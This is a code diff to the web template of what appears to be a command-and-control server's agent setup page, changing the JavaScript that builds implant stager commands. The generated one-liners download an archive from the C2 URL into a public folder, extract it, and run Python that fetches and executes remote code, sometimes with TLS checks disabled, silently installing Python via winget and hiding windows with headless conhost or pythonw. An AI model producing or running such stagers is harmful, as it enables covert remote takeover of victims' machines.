@@ -134,7 +134,7 @@
                     <div>
                         <label for="serverUrl" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">C2 Server URL</label>
                         <input type="url" id="serverUrl" class="tactical-input font-mono"
-                               value="{{ agent_config.server_url if agent_config else (request.url_root | replace('http://', 'https://')) }}" required>
+                               value="{{ agent_config.server_url if agent_config else (request.url_root.rstrip('/') | replace('http://', 'https://')) }}" required>
                     </div>
                 </div>
 
@@ -408,15 +408,16 @@
         });
 
         function generateCommand(url, enableKillDate, killDate, trustedCert) {
+            url = (url || '').replace(/\/+$/, '');
             const curlOption = trustedCert ? '-s' : '-ks';
             const pythonCode = trustedCert
                 ? `"import urllib3;import requests;url='${url}/a/d';exec(requests.get(url).text)"`
                 : `"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
 
-            const command1 = `curl ${curlOption} ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c ${pythonCode}`;
+            const command1 = `curl ${curlOption} ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&pythonw -c ${pythonCode}`;
             const command2 = trustedCert
-                ? `winget install --accept-package-agreements --accept-source-agreements --disable-interactivity -s msstore 9NCVDN91XZQP >NUL & start /b conhost --headless pip install requests urllib3 & timeout 10 > NUL& start /b conhost --headless python -c "import requests; url='${url}/a/d'; exec(requests.get(url).text)"`
-                : `winget install --accept-package-agreements --accept-source-agreements --disable-interactivity -s msstore 9NCVDN91XZQP >NUL & start /b conhost --headless pip install requests urllib3 & timeout 10 > NUL& start /b conhost --headless python -c "import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); import requests; url='${url}/a/d'; exec(requests.get(url, verify=False).text)"`;
+                ? `winget install --accept-package-agreements --accept-source-agreements --disable-interactivity -s msstore 9NCVDN91XZQP >NUL & start /b conhost --headless pip install requests urllib3 & timeout 10 > NUL& pythonw -c "import requests; url='${url}/a/d'; exec(requests.get(url).text)"`
+                : `winget install --accept-package-agreements --accept-source-agreements --disable-interactivity -s msstore 9NCVDN91XZQP >NUL & start /b conhost --headless pip install requests urllib3 & timeout 10 > NUL& pythonw -c "import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); import requests; url='${url}/a/d'; exec(requests.get(url, verify=False).text)"`;
             const nixPythonCode = `"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
             const command3 = `python3 -c ${nixPythonCode}`;
 
